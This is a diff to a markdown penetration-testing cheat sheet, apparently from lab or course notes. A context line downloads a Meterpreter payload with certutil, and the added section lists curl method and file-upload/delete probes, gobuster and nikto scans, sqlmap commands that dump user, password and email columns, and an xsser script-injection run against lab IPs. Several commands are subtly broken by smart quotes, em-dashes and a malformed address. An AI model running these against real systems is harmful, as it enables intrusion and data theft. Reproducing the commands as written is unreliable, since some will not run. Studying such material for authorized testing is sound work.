@@ -131,3 +131,51 @@ On the target machine we can download the payload and execute it. Remember to se
 ```
 certutil -urlcache -f http://10.10.10.2/meterpreter.exe meterpreter.exe
 ```
+
+
+## Web Application Penetration Testing
+
+### Method Enumeration
+```
+curl -X GET 10.10.10.1 - GET request emulation
+curl -I 10.10.10.1 - header enumeration
+curl -X OPTIONS 10.10.10.1 -v - methods enumeration
+curl -X PUT 10.10.10.1 -v - PUT method enumeration
+curl -X POST 10.10.101./login.php -d “name=john&password=password” -v
+curl 10.10.10.1/uploads/ —upload-file hello.txt - use POST method to upload a file
+curl -X DELETE 10.10.10.1/uploads/hello.txt - use DELETE method to delete a file
+```
+
+### GoBuster - directory enumeration
+```
+gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt - U username - P password
+```
+
+### Nikto - scanning web application
+```
+nikto -h http://10.10.10.1 - aggressive vulnerability enumeration
+nikto -h http://192.158.197.3/index.php?page=arbitrary-file-inclusion.php --Tuning 5 --Display V -o nikto.html --Format htm - to print results in a HTML readable format
+nikto -h http://10.10.10.10:8080/ -id user:password - directory enumeration with username and password
+```
+
+### SQLMap - SQL Injection
+```
+sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title
+sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title —dbs - databases enumeration
+sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp —tables - table enumeration
+sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp -T user —columns - columns enumeration
+sqlmap -u “http://10.10.10.1/sqli_1.php?titlejoe&action=search” —cookie PHPSESSID=39olsnl8q20cdl0f6k5tfq4fh3; security_level=0” -p title -D bWapp -T user -C admin, password, email  - values of the selected columns
+```
+
+### XSSer - XSS attack
+```
+xsser --url "http://192.23.148.3/htmli_get.php?firstname=XSS&lastname=joe&form=submit” —cookies=“security_level=0; PHPSESSID=vkfjeewirfhkvdkbogiaognaovn”
+```
+"XSS" must be inserted into the location to be tested.
+
+This flag can be used to execute a specific script.
+```
+xsser --url "http://192.23.148.3/htmli_get.php?firstname=XSS&lastname=joe&form=submit” —cookies=“security_level=0; PHPSESSID=vkfjeewirfhkvdkbogiaognaovn” —Fp “<script>alert(1)</script>”
+```
+
+
